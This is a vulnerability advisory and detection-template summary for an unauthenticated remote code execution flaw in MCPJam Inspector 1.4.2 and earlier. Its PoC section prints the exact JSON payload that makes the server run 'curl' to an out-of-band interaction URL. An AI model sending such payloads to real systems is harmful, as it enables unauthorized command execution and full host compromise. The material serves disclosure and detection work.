## Vulnerability
MCPJam Inspector (local-first development platform for MCP servers) versions 1.4.2 and earlier contain an unauthenticated remote code execution flaw. An attacker can send a crafted HTTP POST to the exposed `/api/mcp/connect` endpoint with a `serverConfig` object that specifies arbitrary `command` and `args` (e.g., `curl` to an attacker-controlled URL), causing the server to install and execute the supplied command. Successful exploitation yields full host compromise (CVSS 3.1: 9.8, AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H; CWE-306). Remediation: upgrade to 1.4.3 or later and bind the service to 127.0.0.1 only.

## PoC / Detection
Classification: rce

The template issues a single POST request to `/api/mcp/connect` containing JSON `{"serverConfig":{"timeout":10000,"command":"curl","args":["{{interactsh-url}}"],"env":{}},"serverId":"mymcp"}`. Detection succeeds when the response is HTTP 500 with JSON content-type, body containing both "Connection failed for server" and "MCP error", **and** an out-of-band DNS interaction is observed on the interactsh domain—confirming the supplied command executed on the target.
